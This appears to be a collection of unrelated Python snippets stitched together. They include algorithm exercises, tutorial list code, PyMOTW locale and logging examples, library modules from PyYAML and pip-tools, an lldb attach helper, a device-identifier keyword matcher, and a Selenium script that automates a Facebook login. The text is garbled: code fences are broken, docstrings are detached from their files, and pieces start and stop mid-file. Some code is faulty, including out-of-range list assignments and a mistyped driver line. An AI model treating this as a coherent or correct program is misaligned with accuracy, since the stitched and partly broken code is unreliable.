        longitude_bin = self.get_bin(longitude, -180, 180)
        hash_code, b = "", ""
        for i in range(30):
            b += longitude_bin[i] + latitude_bin[i]

        for i in range(0, 60, 5):
            hash_code += _base32[int(b[i : i + 5], 2)]

        return hash_code[:precision]

    def get_bin(self, value, left, right):
        b = ""
        for i in range(30):
            mid = left + (right - left) / 2
            if value > mid:
                left = mid
                b += "1"
            else:
                right = mid
                b += "0"
        return b

class GeoHash:
    """
    @param: geohash: geohash a base32 string
    @return: latitude and longitude a location coordinate pair
    """

    def decode(self, geohash):
        _base32 = "0123456789bcdefghjkmnpqrstuvwxyz"
        b = ""
        for c in geohash:
            b += self.i2b(_base32.find(c))

        odd = "".join(b[i] for i in range(0, len(b), 2))
        even = "".join(b[i] for i in range(1, len(b), 2))

        location = []
        location.append(self.get_location(-90.0, 90.0, even))
        location.append(self.get_location(-180.0, 180.0, odd))
        return location

    def i2b(self, val):
        b = ""
        for i in range(5):
            if val % 2:
                b = "1" + b
            else:
                b = "0" + b
            val //= 2
        return b

    def get_location(self, start, end, string):
        for c in string:
            mid = start + (end - start) / 2
            if c == "1":
                start = mid
            else:
                end = mid
        return (start + end) / 2.0

class Data:
    def __init__(self, val, expired):
        self.val = val
        self.expired = expired


class Memcache:
    def __init__(self):
        # do intialization if necessary
        self.cache = {}

    """
    @param: curtTime: An integer
    @param: key: An integer
    @return: An integer
    """

    def get(self, curtTime, key):
        # write your code here
        if key not in self.cache:
            return 2147483647
        curr = self.cache[key]
        if curr.expired >= curtTime or curr.expired == -1:
            return curr.val
        else:
            return 2147483647

    """
    @param: curtTime: An integer
    @param: key: An integer
    @param: value: An integer
    @param: ttl: An integer
    @return: nothing
    """

    def set(self, curtTime, key, value, ttl):
        # write your code here
        if ttl:
            data = Data(value, curtTime + ttl - 1)
        else:
            data = Data(value, -1)
        self.cache[key] = data

    """
    @param: curtTime: An integer
    @param: key: An integer
    @return: nothing
    """

    def delete(self, curtTime, key):
        # write your code here
        if key not in self.cache:
            return
        del self.cache[key]

    """
    @param: curtTime: An integer
    @param: key: An integer
    @param: delta: An integer
    @return: An integer
    """

    def incr(self, curtTime, key, delta):
        # write your code here
        if self.get(curtTime, key) == 2147483647:
            return 2147483647
        self.cache[key].val += delta
        return self.cache[key].val

    """
    @param: curtTime: An integer
    @param: key: An integer
    @param: delta: An integer
    @return: An integer
    """

    def decr(self, curtTime, key, delta):
        # write your code here
        if self.get(curtTime, key) == 2147483647:
            return 2147483647
        self.cache[key].val -= delta
        return self.cache[key].val

import string


class TrieNode:
    def __init__(self):
        self.isWord = False
        self.word = None
        self.children = {}


class Trie:
    def __init__(self):
        self.root = TrieNode()

    def insert(self, word):
        node = self.root
        for c in word:
            if c not in node.children:
                node.children[c] = TrieNode()
            node = node.children[c]
        node.isWord = True
        node.word = word


class Solution:
    """
    @param words: a set of stirngs
    @param target: a target string
    @param k: An integer
    @return: output all the strings that meet the requirements
    """

    def kDistance(self, words, target, k):
        trie = Trie()
        for word in words:
            trie.insert(word)
        n = len(target)
        f = range(n + 1)
        result = []
        self.dfs(trie.root, f, result, n, k, target)
        return result

    def dfs(self, node, f, result, n, k, target):
        if node.isWord and f[n] <= k:
            result.append(node.word)

        for c in string.ascii_lowercase:
            if c not in node.children:
                continue

            newf = [0] * (n + 1)
            for i in range(n + 1):
                newf[i] = f[i] + 1

            for i in range(1, n + 1):
                newf[i] = min(f[i - 1] + 1, newf[i])

            for i in range(1, n + 1):
                if c == target[i - 1]:
                    newf[i] = min(f[i - 1], newf[i])
                newf[i] = min(newf[i - 1] + 1, newf[i])
            self.dfs(node.children[c], newf, result, n, k, target)
````

````py
Author: Omkar Pathak
Created At: 25th August 2017```


```py
import inspect


def longest_increasing_subsequence(_list):
    """
    The Longest Increasing Subsequence (LIS) problem is to find the length of the longest subsequence of a
    given sequence such that all elements of the subsequence are sorted in increasing order. For example,
    the length of LIS for [10, 22, 9, 33, 21, 50, 41, 60, 80] is 6 and LIS is [10, 22, 33, 50, 60, 80].

    :param _list: an array of elements
    :return: returns a tuple of maximum length of lis and an array of the elements of lis
    """
    # Initialize list with some value
    lis = [1] * len(_list)
    # list for storing the elements in an lis
    elements = [0] * len(_list)

    # Compute optimized LIS values in bottom up manner
    for i in range(1, len(_list)):
        for j in range(0, i):
            if _list[i] > _list[j] and lis[i] < lis[j] + 1:
                lis[i] = lis[j] + 1
                elements[i] = j

    # find the maximum of the whole list and get its index in idx
    maximum = max(lis)
    idx = lis.index(maximum)

    # for printing the elements later
    seq = [_list[idx]]
    while idx != elements[idx]:
        idx = elements[idx]
        seq.append(_list[idx])

    return (maximum, seq[::-1])


def get_code():
    """
    returns the code for the longest_increasing_subsequence function
    """
    return inspect.getsource(longest_increasing_subsequence)

#!/usr/bin/env python```


```py Print all of the clone-urls for a GitHub organization.
It requires the pygithub3 module, which you can install like this::
    $ sudo yum -y install python-virtualenv
    $ mkdir scratch
    $ cd scratch
    $ virtualenv my-virtualenv
    $ source my-virtualenv/bin/activate
    $ pip install pygithub3
Usage example::
    $ python list-all-repos.py
Advanced usage.  This will actually clone all the repos for a
GitHub organization or user::
    $ for url in $(python list-all-repos.py); do git clone $url; done```


```py

import pygithub3

gh = None


def gather_clone_urls(organization, no_forks=True):
    all_repos = gh.repos.list(user=organization).all()
    for repo in all_repos:

        # Don't print the urls for repos that are forks.
        if no_forks and repo.fork:
            continue

        yield repo.clone_url


if __name__ == '__main__':
    gh = pygithub3.Github()

    clone_urls = gather_clone_urls("FOSSRIT")
    for url in clone_urls:
        print url
````

```py
Given a non-empty, singly linked list with head node head, return a middle node of linked list.

If there are two middle nodes, return the second middle node.
```

````py


# Definition for singly-linked list.
class ListNode:
    def __init__(self, x):
        self.val = x
        self.next = None


class Solution:
    def middleNode(self, head: ListNode) -> ListNode:
        get_len = 0
        current = head
        while current:
            get_len += 1
            current = current.next
        mid = get_len // 2
        current = head
        while mid > 0:
            current = current.next
            mid -= 1
        return current

# list operations
# You can create a list by putting elements inside square brackets[]
# lists are capable of containing any type of data

# a list can contain datas of different datatypes
numsAndAlphas = ["a", 1, "hello", 3.14159265359, "are you okay", True, "good", False]
# this is going to work
print(numsAndAlphas)

# list accessing
# You can access single items from the list similar to string indexing
# if you dont know string indexing look for my program called stringOperations.py
print(numsAndAlphas[0])
print(numsAndAlphas[1:5])
print(numsAndAlphas[0:])
print(numsAndAlphas[:6])
print(numsAndAlphas[:])
print(numsAndAlphas[2:7:2])
print(numsAndAlphas[::3])

# you can add lists too...
list2 = [2, 9, 16, 25, 36, 49, 64, 81, 100, 144]
newList = numsAndAlphas + list2

# list operations part 2

siliconValley = [
    "Google",
    "Apple",
    "Dropbox",
    "Facebook",
    "Cisco",
    "Adobe",
    "Oracle",
    "Samsung",
]
print(siliconValley)

# hmm seems like i forgot to add Electronic Arts in the list siliconValley
# This will add the element at the end of the list
siliconValley.append("Electronic Arts")
print(siliconValley)

# thats cool but I want my element at specific position
siliconValley.insert(5, "AMD")
# 5 is the position and whatever you add after comma is element

# Okay enough I want to pop out an element from list and I want to use it in a string
# you have to provide the index of elementyou want to pop out
poppedElement = siliconValley.pop(4)
print("Popped element is " + poppedElement)

# Oops I Samsung isnt in silicon valley, I have to remove Samsung from list
# How am I gonna do thats
# You have to enter the element in parenthesis and not it's index
siliconValley.remove("Samsung")
print(siliconValley)

# I want to sort the list in alphabetical order
# How to do thats
# simple
siliconValley.sort()
# or
sorted(siliconValley)
print(siliconValley)

# I wanted list in reverse alphabetical order
# simple
siliconValley.sort(reverse=True)
# or
sorted(siliconValley, reverse=True)  # seperate the reverse with comma
print(siliconValley)

# Okay what if i dont know about the index of an element but i want to print only that element
googleIndex = siliconValley.index("Google")
print(siliconValley[googleIndex])

# I am tired of watching those elements again and again
# How I am going to do thats
# easy
del siliconValley
print(siliconValley)  # this should probably give you an NameError

getLi = [12, 43, 7, 43, 87, 89, 56, 9809, 9878, 56, 78, 98, True, 56, 76]
reverseList = getLi[::-1]  # [::-1] tells to step from end without difference
print(reverseList)

list_of_even_squares = [num ** 2 for num in range(0, 101, 2)]
print(list_of_even_squares, "\n")

list_of_odd_squares = [num ** 2 for num in range(1, 102, 2)]
print(list_of_odd_squares, "\n")

list_of_even_cubes = [num ** 3 for num in range(0, 101, 2)]
print(list_of_even_cubes, "\n")

list_of_odd_cubes = [num ** 3 for num in range(1, 102, 2)]
print(list_of_odd_cubes, "\n")

# -*- coding: utf-8 -*-```


```py
Created on Fri Jan 12 18:08:44 2018

@author: fgrimps```


```py
import re

text = {
    '"version_name"': '"8.5.2"',
    '"abi"': '"arm64-v8a"',
    '"x_dpi"': "515.1539916992188",
    '"environment"': '{"sdk_version"',
    '"time_zone"': '"America\\/Wash"',
    '"user"': "{}}",
    '"density_default"': "560}}",
    '"resolution_width"': "1440",
    '"package_name"': '"com.okcupid.okcupid"',
    '"d44bcbfb-873454-4917-9e02-2066d6605d9f"': '{"language"',
    '"country"': '"US"}',
    '"now"': "1.515384841291E9",
    '{"extras"': '{"sessions"',
    '"device"': '{"android_version"',
    '"y_dpi"': "37abc5afce16xxx",
    '"model"': '"Nexus 6P"',
    '"new"': "true}]",
    '"only_respond_with"': """["triggers"]}
0\r
\r```


```py,
    '"start_time"': "1.51538484115E9",
    '"version_code"': "1057",
    '"-104.99875"': '"0"',
    '"no_acks"': "true}",
    '"display"': '{"resolution_height"',
}


Keywords = [
    "37abc5afce16xxx",
    "867686022684243",
    "ffffffff-f336-7a7a-0f06-65f40033c587",
    "long",
    "Lat",
    "uuid",
    "WIFI",
    "advertiser",
    "d44bcbfb-873454-4917-9e02-2066d6605d9f",
    "deviceFinger",
    "medialink",
    "Huawei",
    "Andriod",
    "US",
    "local_ip",
    "Nexus",
    "android2.10.3",
    "WIFI",
    "operator",
    "carrier",
    "angler",
    "MMB29M",
    "-104.99875",
]

for key, values1 in text.items():
    for x in Keywords:
        pattern = ".*" + str(x) + ".*"
        if re.findall(pattern, str(values1), re.M):
            print("Match")
            print(x)
        # else:
        #    print('Not Match')

l = []  # 5
# real len = 10
# logical len = 5
l = [None] * 5
l[0] = 10
l[1] = 23
l[2] = 3434
l[3] = 234234
l[4] = 121
l[5] = 3423


l = [None] * 10
l[0] = 10
l[1] = 23
l[2] = 3434
l[3] = 234234
l[4] = 121
l[5] = 3423
l[6] = 23
l[7] = 10
l[8] = 23
l[9] = 3434
l[10] = 234234

l = [None] * 20

l[0] = 10
l[1] = 23
l[2] = 3434
l[3] = 234234
l[4] = 121
l[5] = 3423
l[6] = 23
l[7] = 10
l[8] = 23
l[9] = 3434
l[10] = 234234
from functools import partial
from typing import Callable, List, Tuple

import pytest  # type: ignore
import numpy as np

AR = np.array(0)
AR.setflags(write=False)

KACF = frozenset({None, "K", "A", "C", "F"})
ACF = frozenset({None, "A", "C", "F"})
CF = frozenset({None, "C", "F"})

order_list: List[Tuple[frozenset, Callable]] = [
    (KACF, partial(np.ndarray, 1)),
    (KACF, AR.tobytes),
    (KACF, partial(AR.astype, int)),
    (KACF, AR.copy),
    (ACF, partial(AR.reshape, 1)),
    (KACF, AR.flatten),
    (KACF, AR.ravel),
    (KACF, partial(np.array, 1)),
    (CF, partial(np.zeros, 1)),
    (CF, partial(np.ones, 1)),
    (CF, partial(np.empty, 1)),
    (CF, partial(np.full, 1, 1)),
    (KACF, partial(np.zeros_like, AR)),
    (KACF, partial(np.ones_like, AR)),
    (KACF, partial(np.empty_like, AR)),
    (KACF, partial(np.full_like, AR, 1)),
    (KACF, partial(np.add, 1, 1)),  # i.e. np.ufunc.__call__
    (ACF, partial(np.reshape, AR, 1)),
    (KACF, partial(np.ravel, AR)),
    (KACF, partial(np.asarray, 1)),
    (KACF, partial(np.asanyarray, 1)),
]

for order_set, func in order_list:
    for order in order_set:
        func(order=order)

    invalid_orders = KACF - order_set
    for order in invalid_orders:
        with pytest.raises(ValueError):
            func(order=order)
````

````py
Helpers used in all linked list solutions.
This file is created to avoid duplicate code in all linked list solutions.```


```py


class ListNode:
    def __init__(self, x, n=None):
        """Definition for singly-linked list."""
        self.val = x
        self.next = n


def build_ll(arr):
    """Builds a linked list from array. Used for testing."""
    res = ListNode(None)
    pt = res

    for num in arr:
        pt.next = ListNode(num)
        pt = pt.next

    return res.next


def print_ll(head):
    """Prints a linked list in this format: x -> y -> z. Used for testing."""
    res = []

    while head != None:
        res.append(str(head.val))
        head = head.next

    print(" -> ".join(res))

# This file is meant to be run inside lldb
# It registers command to load library and invoke attach function
# Also it marks process threads to to distinguish them from debugger
# threads later while settings trace in threads

def load_lib_and_attach(debugger, command, result, internal_dict):
    import shlex
    args = shlex.split(command)

    dll = args[0]
    is_debug = args[1]
    python_code = args[2]
    show_debug_info = args[3]

    import lldb
    options = lldb.SBExpressionOptions()
    options.SetFetchDynamicValue()
    options.SetTryAllThreads(run_others=False)
    options.SetTimeoutInMicroSeconds(timeout=10000000)

    print(dll)
    target = debugger.GetSelectedTarget()
    res = target.EvaluateExpression("(void*)dlopen(\"%s\", 2);" % (
        dll), options)
    error = res.GetError()
    if error:
        print(error)

    print(python_code)
    res = target.EvaluateExpression("(int)DoAttach(%s, \"%s\", %s);" % (
        is_debug, python_code.replace('"', "'"), show_debug_info), options)
    error = res.GetError()
    if error:
        print(error)

def __lldb_init_module(debugger, internal_dict):
    import lldb

    debugger.HandleCommand('command script add -f lldb_prepare.load_lib_and_attach load_lib_and_attach')

    try:
        target = debugger.GetSelectedTarget()
        if target:
            process = target.GetProcess()
            if process:
                for thread in process:
                    # print('Marking process thread %d'%thread.GetThreadID())
                    internal_dict['_thread_%d' % thread.GetThreadID()] = True
                    # thread.Suspend()
    except:
        import traceback;traceback.print_exc()





__all__ = ['BaseLoader', 'FullLoader', 'SafeLoader', 'Loader', 'UnsafeLoader']

from reader import *
from scanner import *
from parser import *
from composer import *
from constructor import *
from resolver import *

class BaseLoader(Reader, Scanner, Parser, Composer, BaseConstructor, BaseResolver):

    def __init__(self, stream):
        Reader.__init__(self, stream)
        Scanner.__init__(self)
        Parser.__init__(self)
        Composer.__init__(self)
        BaseConstructor.__init__(self)
        BaseResolver.__init__(self)

class FullLoader(Reader, Scanner, Parser, Composer, FullConstructor, Resolver):

    def __init__(self, stream):
        Reader.__init__(self, stream)
        Scanner.__init__(self)
        Parser.__init__(self)
        Composer.__init__(self)
        FullConstructor.__init__(self)
        Resolver.__init__(self)

class SafeLoader(Reader, Scanner, Parser, Composer, SafeConstructor, Resolver):

    def __init__(self, stream):
        Reader.__init__(self, stream)
        Scanner.__init__(self)
        Parser.__init__(self)
        Composer.__init__(self)
        SafeConstructor.__init__(self)
        Resolver.__init__(self)

class Loader(Reader, Scanner, Parser, Composer, Constructor, Resolver):

    def __init__(self, stream):
        Reader.__init__(self, stream)
        Scanner.__init__(self)
        Parser.__init__(self)
        Composer.__init__(self)
        Constructor.__init__(self)
        Resolver.__init__(self)

# UnsafeLoader is the same as Loader (which is and was always unsafe on
# untrusted input). Use of either Loader or UnsafeLoader should be rare, since
# FullLoad should be able to load almost all YAML safely. Loader is left intact
# to ensure backwards compatibility.
class UnsafeLoader(Reader, Scanner, Parser, Composer, Constructor, Resolver):

    def __init__(self, stream):
        Reader.__init__(self, stream)
        Scanner.__init__(self)
        Parser.__init__(self)
        Composer.__init__(self)
        Constructor.__init__(self)
        Resolver.__init__(self)

# coding: utf-8
from __future__ import absolute_import, division, print_function, unicode_literals

from contextlib import contextmanager

from .._compat import PIP_VERSION, FAVORITE_HASH
from .base import BaseRepository

from piptools.utils import as_tuple, key_from_ireq, make_install_requirement


def ireq_satisfied_by_existing_pin(ireq, existing_pin):
    """
    Return True if the given InstallationRequirement is satisfied by the
    previously encountered version pin.
    """
    version = next(iter(existing_pin.req.specifier)).version
    return ireq.req.specifier.contains(
        version, prereleases=existing_pin.req.specifier.prereleases
    )


class LocalRequirementsRepository(BaseRepository):
    """
    The LocalRequirementsRepository proxied the _real_ repository by first
    checking if a requirement can be satisfied by existing pins (i.e. the
    result of a previous compile step).

    In effect, if a requirement can be satisfied with a version pinned in the
    requirements file, we prefer that version over the best match found in
    PyPI.  This keeps updates to the requirements.txt down to a minimum.
    """

    def __init__(self, existing_pins, proxied_repository):
        self.repository = proxied_repository
        self.existing_pins = existing_pins

    @property
    def options(self):
        return self.repository.options

    @property
    def finder(self):
        return self.repository.finder

    @property
    def session(self):
        return self.repository.session

    @property
    def DEFAULT_INDEX_URL(self):
        return self.repository.DEFAULT_INDEX_URL

    def clear_caches(self):
        self.repository.clear_caches()

    def freshen_build_caches(self):
        self.repository.freshen_build_caches()

    def find_best_match(self, ireq, prereleases=None):
        key = key_from_ireq(ireq)
        existing_pin = self.existing_pins.get(key)
        if existing_pin and ireq_satisfied_by_existing_pin(ireq, existing_pin):
            project, version, _ = as_tuple(existing_pin)
            return make_install_requirement(
                project, version, ireq.extras, ireq.markers,
                constraint=ireq.constraint
            )
        else:
            return self.repository.find_best_match(ireq, prereleases)

    def get_dependencies(self, ireq):
        return self.repository.get_dependencies(ireq)

    def get_hashes(self, ireq):
        key = key_from_ireq(ireq)
        existing_pin = self.existing_pins.get(key)
        if existing_pin and ireq_satisfied_by_existing_pin(ireq, existing_pin):
            if PIP_VERSION[:2] <= (20, 0):
                hashes = existing_pin.options.get("hashes", {})
            else:
                hashes = existing_pin.hash_options
            hexdigests = hashes.get(FAVORITE_HASH)
            if hexdigests:
                return {
                    ":".join([FAVORITE_HASH, hexdigest]) for hexdigest in hexdigests
                }
        return self.repository.get_hashes(ireq)

    @contextmanager
    def allow_all_wheels(self):
        with self.repository.allow_all_wheels():
            yield

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyConverting strings to floating point numbers.```


```py

#end_pymotw_header
import locale

sample_data = [
    ('USA', 'en_US', '1,234.56'),
    ('France', 'fr_FR', '1234,56'),
    ('Spain', 'es_ES', '1234,56'),
    ('Portugal', 'pt_PT', '1234.56'),
    ('Poland', 'pl_PL', '1 234,56'),
]

for name, loc, a in sample_data:
    locale.setlocale(locale.LC_ALL, loc)
    print('{:>10}: {:>9} => {:f}'.format(
        name,
        a,
        locale.atof(a),
    ))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyShow the same currency value in different locales.```


```py

#end_pymotw_header
import locale

sample_locales = [
    ('USA', 'en_US'),
    ('France', 'fr_FR'),
    ('Spain', 'es_ES'),
    ('Portugal', 'pt_PT'),
    ('Poland', 'pl_PL'),
]

for name, loc in sample_locales:
    locale.setlocale(locale.LC_ALL, loc)
    print('{:>10}: {:>10}  {:>10}'.format(
        name,
        locale.currency(1234.56),
        locale.currency(-1234.56),
    ))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pyPrint dates in locale-specfic format.```


```py

#end_pymotw_header
import locale
import time

sample_locales = [
    ('USA', 'en_US'),
    ('France', 'fr_FR'),
    ('Spain', 'es_ES'),
    ('Portugal', 'pt_PT'),
    ('Poland', 'pl_PL'),
]

for name, loc in sample_locales:
    locale.setlocale(locale.LC_ALL, loc)
    format = locale.nl_langinfo(locale.D_T_FMT)
    print('{:>10}: {}'.format(name, time.strftime(format)))

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```









---


```py


#end_pymotw_header
import locale

sample_locales = [
    ('USA', 'en_US'),
    ('France', 'fr_FR'),
    ('Spain', 'es_ES'),
    ('Portugal', 'pt_PT'),
    ('Poland', 'pl_PL'),
]

for name, loc in sample_locales:
    locale.setlocale(locale.LC_ALL, loc)
    localized = locale.format_string('%0.2f', 123456.78, grouping=True)
    delocalized = locale.delocalize(localized)
    print('{:>10}: {:>10}  {:>10}'.format(
        name,
        localized,
        delocalized,
    ))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyExample setting the locale using environment variable(s).```


```py

#end_pymotw_header
import locale
import os
import pprint

# Default settings based on the user's environment.
locale.setlocale(locale.LC_ALL, '')

print('Environment settings:')
for env_name in ['LC_ALL', 'LC_CTYPE', 'LANG', 'LANGUAGE']:
    print('  {} = {}'.format(
        env_name, os.environ.get(env_name, ''))
    )

# What is the locale?
print('\nLocale from environment:', locale.getlocale())

template = """
Numeric formatting:

  Decimal point      : "{decimal_point}"
  Grouping positions : {grouping}
  Thousands separator: "{thousands_sep}"

Monetary formatting:

  International currency symbol   : "{int_curr_symbol!r}"
  Local currency symbol           : {currency_symbol!r}
  Symbol precedes positive value  : {p_cs_precedes}
  Symbol precedes negative value  : {n_cs_precedes}
  Decimal point                   : "{mon_decimal_point}"
  Digits in fractional values     : {frac_digits}
  Digits in fractional values,
                   international  : {int_frac_digits}
  Grouping positions              : {mon_grouping}
  Thousands separator             : "{mon_thousands_sep}"
  Positive sign                   : "{positive_sign}"
  Positive sign position          : {p_sign_posn}
  Negative sign                   : "{negative_sign}"
  Negative sign position          : {n_sign_posn}
````

````py

sign_positions = {
    0: 'Surrounded by parentheses',
    1: 'Before value and symbol',
    2: 'After value and symbol',
    3: 'Before value',
    4: 'After value',
    locale.CHAR_MAX: 'Unspecified',
}

info = {}
info.update(locale.localeconv())
info['p_sign_posn'] = sign_positions[info['p_sign_posn']]
info['n_sign_posn'] = sign_positions[info['n_sign_posn']]

print(template.format(**info))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```









---


```py


#end_pymotw_header
import locale

sample_locales = [
    ('USA', 'en_US'),
    ('France', 'fr_FR'),
    ('Spain', 'es_ES'),
    ('Portugal', 'pt_PT'),
    ('Poland', 'pl_PL'),
]

print('{:>10} {:>10} {:>15}'.format(
    'Locale', 'Integer', 'Float')
)
for name, loc in sample_locales:
    locale.setlocale(locale.LC_ALL, loc)

    print('{:>10}'.format(name), end=' ')
    print(locale.format_string('%10d', 123456, grouping=True), end=' ')
    print(locale.format_string('%15.2f', 123456.78, grouping=True))

import os
from shutil import rmtree

from ._compat import user_cache_dir

from .click import secho

# The user_cache_dir helper comes straight from pipenv.patched.notpip itself
try:
    from pipenv.environments import PIPENV_CACHE_DIR as CACHE_DIR
except ImportError:
    CACHE_DIR = user_cache_dir("pipenv")

# NOTE
# We used to store the cache dir under ~/.pip-tools, which is not the
# preferred place to store caches for any platform.  This has been addressed
# in pip-tools==1.0.5, but to be good citizens, we point this out explicitly
# to the user when this directory is still found.
LEGACY_CACHE_DIR = os.path.expanduser("~/.pip-tools")

if os.path.exists(LEGACY_CACHE_DIR):
    secho(
        "Removing old cache dir {} (new cache dir is {})".format(
            LEGACY_CACHE_DIR, CACHE_DIR
        ),
        fg="yellow",
    )
    rmtree(LEGACY_CACHE_DIR)

# -*- coding=utf-8 -*-

from __future__ import absolute_import, print_function, unicode_literals

from ..actions.lock import lock
from ._base import BaseCommand


class Command(BaseCommand):
    name = "lock"
    description = "Generate Pipfile.lock."

    def run(self, options):
        return lock(project=options.project)


if __name__ == "__main__":
    Command.run_parser()
````

````pyA simple log mechanism styled after PEP 282."""

# The class here is styled after PEP 282 so that it could later be
# replaced with a standard Python logging implementation.

DEBUG = 1
INFO = 2
WARN = 3
ERROR = 4
FATAL = 5

import sys


class Log:
    def __init__(self, threshold=WARN):
        self.threshold = threshold

    def _log(self, level, msg, args):
        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):
            raise ValueError("%s wrong log level" % str(level))

        if level >= self.threshold:
            if args:
                msg = msg % args
            if level in (WARN, ERROR, FATAL):
                stream = sys.stderr
            else:
                stream = sys.stdout
            try:
                stream.write("%s\n" % msg)
            except UnicodeEncodeError:
                # emulate backslashreplace error handler
                encoding = stream.encoding
                msg = msg.encode(encoding, "backslashreplace").decode(encoding)
                stream.write("%s\n" % msg)
            stream.flush()

    def log(self, level, msg, *args):
        self._log(level, msg, args)

    def debug(self, msg, *args):
        self._log(DEBUG, msg, args)

    def info(self, msg, *args):
        self._log(INFO, msg, args)

    def warn(self, msg, *args):
        self._log(WARN, msg, args)

    def error(self, msg, *args):
        self._log(ERROR, msg, args)

    def fatal(self, msg, *args):
        self._log(FATAL, msg, args)


_global_log = Log()
log = _global_log.log
debug = _global_log.debug
info = _global_log.info
warn = _global_log.warn
error = _global_log.error
fatal = _global_log.fatal


def set_threshold(level):
    # return the old threshold for use from tests
    old = _global_log.threshold
    _global_log.threshold = level
    return old


def set_verbosity(v):
    if v <= 0:
        set_threshold(WARN)
    elif v == 1:
        set_threshold(INFO)
    elif v >= 2:
        set_threshold(DEBUG)

from ..prometheus.metrics import HTTP_REQUEST_DURATION_SECONDS


def prometheus_log_method(handler):
    """
    Tornado log handler for recording RED metrics.

    We record the following metrics:
       Rate - the number of requests, per second, your services are serving.
       Errors - the number of failed requests per second.
       Duration - The amount of time each request takes expressed as a time interval.

    We use a fully qualified name of the handler as a label,
    rather than every url path to reduce cardinality.

    This function should be either the value of or called from a function
    that is the 'log_function' tornado setting. This makes it get called
    at the end of every request, allowing us to record the metrics we need.
    """
    HTTP_REQUEST_DURATION_SECONDS.labels(
        method=handler.request.method,
        handler='{}.{}'.format(handler.__class__.__module__, type(handler).__name__),
        status_code=handler.get_status()
    ).observe(handler.request.request_time())

# Exhaustive numeration (iteration)
# Simple implementation of logarithmic function
# I love math!

# log(b, x) <=> b ** y = x
# So we have to find y!

# Don't use it for decimal numbers
# log(1000) or log(e, x) is not automatically avaliable
def logarithm_integer(b, x):
    if (b > 0 and b != 1) and x > 0:
        for i in range(x):
            if b ** i == x:
                return i
        return -1
    else:
        return "Invalid input for logarithm"


# Test
print("log(6, 216) -> " + str(logarithm_integer(6, 216)))
print("log(5, 625) -> " + str(logarithm_integer(5, 25)))
print("log(4, 16) -> " + str(logarithm_integer(4, 16)))
print("log(2, 8) -> " + str(logarithm_integer(2, 8)))
print("log(3, 6) -> " + str(logarithm_integer(3, 6)))
print("log(0, 16) -> " + str(logarithm_integer(0, 16)))

#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Configure your logger.
import logging
import coloredlogs

logger = logging.getLogger("your-module")
logger.addHandler(coloredlogs.ColoredStreamHandler())

# Some examples.
logger.setLevel(logging.DEBUG)
logger.debug("this is a debugging message")
logger.info("this is an informational message")
logger.warn("this is a warning message")
logger.error("this is an error message")
logger.fatal("this is a fatal message")
logger.critical("this is a critical message")

#!/usr/bin/env python3```


```pySimple logging to stderr using different levels.```


```py

#end_pymotw_header
import logging
import warnings

logging.basicConfig(
    level=logging.INFO,
)

warnings.warn('This warning is not sent to the logs')

logging.captureWarnings(True)

warnings.warn('This warning is sent to the logs')

#!/usr/bin/env python3```


```pyExample use of Python's logging module writing to a file.```


```py

#end_pymotw_header
import logging

LOG_FILENAME = 'logging_example.out'
logging.basicConfig(
    filename=LOG_FILENAME,
    level=logging.DEBUG,
)

logging.debug('This message should go to the log file')

with open(LOG_FILENAME, 'rt') as f:
    body = f.read()

print('FILE:')
print(body)

#!/usr/bin/env python3```


```pySimple logging to stderr using different levels.```


```py

#end_pymotw_header
import logging
import sys

LEVELS = {
    'debug': logging.DEBUG,
    'info': logging.INFO,
    'warning': logging.WARNING,
    'error': logging.ERROR,
    'critical': logging.CRITICAL,
}

if len(sys.argv) > 1:
    level_name = sys.argv[1]
    level = LEVELS.get(level_name, logging.NOTSET)
    logging.basicConfig(level=level)

logging.debug('This is a debug message')
logging.info('This is an info message')
logging.warning('This is a warning message')
logging.error('This is an error message')
logging.critical('This is a critical error message')

#!/usr/bin/env python3```


```pySimulate logging from different modules

See http://blog.doughellmann.com/2007/05/pymotw-logging.html```


```py

#end_pymotw_header
import logging

logging.basicConfig(level=logging.WARNING)

logger1 = logging.getLogger('package1.module1')
logger2 = logging.getLogger('package2.module2')

logger1.warning('This message comes from one module')
logger2.warning('This comes from another module')

#!/usr/bin/env python3```


```pyLog to a file, creating a new file every 20 bytes

See http://blog.doughellmann.com/2007/05/pymotw-logging.html
````

```py

#end_pymotw_header
import glob
import logging
import logging.handlers

LOG_FILENAME = 'logging_rotatingfile_example.out'

# Set up a specific logger with our desired output level
my_logger = logging.getLogger('MyLogger')
my_logger.setLevel(logging.DEBUG)

# Add the log message handler to the logger
handler = logging.handlers.RotatingFileHandler(
    LOG_FILENAME,
    maxBytes=20,
    backupCount=5,
)
my_logger.addHandler(handler)

# Log some messages
for i in range(20):
    my_logger.debug('i = %d' % i)

# See what files are created
logfiles = glob.glob('%s*' % LOG_FILENAME)
for filename in sorted(logfiles):
    print(filename)

# Loading Modules
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
import getpass
import time

login_url = 'https://www.facebook.com/login.php'

email = input("Enter your email address: ")
password = getpass.getpass("Enter your password: ")


def login(email, password):
    driver = webdriver.Chromdriver = webdriver.Chrome(
        './Hacking-Scripts/Python/Automate Login/chromedriver')
    driver.get(login_url)
    time.sleep(1)
    # Entering Email Address
    email_input = driver.find_element_by_id('email')
    email_input.send_keys(email)
    # Entering Password
    password_input = driver.find_element_by_id('pass')
    password_input.send_keys(password)
    # Clicking Login Button
    login_button = driver.find_element_by_id('loginbutton')
    login_button.click()
    time.sleep(2)


if __name__ == '__main__':
    login(email, password)

from flask_wtf import FlaskForm
from wtforms import StringField
from wtforms.validators import DataRequired, Email, ValidationError
from app.models import User


def user_exists(form, field):
    print("Checking if user exists", field.data)
    email = field.data
    user = User.query.filter(User.email == email).first()
    if not user:
        raise ValidationError("Email provided not found.")


def password_matches(form, field):
    print("Checking if password matches")
    password = field.data
    email = form.data["email"]
    user = User.query.filter(User.email == email).first()
    if not user.check_password(password):
        raise ValidationError("Password was incorrect.")


class LoginForm(FlaskForm):
    email = StringField("email", validators=[DataRequired(), user_exists])
    password = StringField("password", validators=[DataRequired(), password_matches])

#!/usr/bin/python

# Logistic Regression from scratch

# In[62]:

# In[63]:

# importing all the required libraries
```

````py
Implementing logistic regression for classification problem
Helpful resources:
Coursera ML course
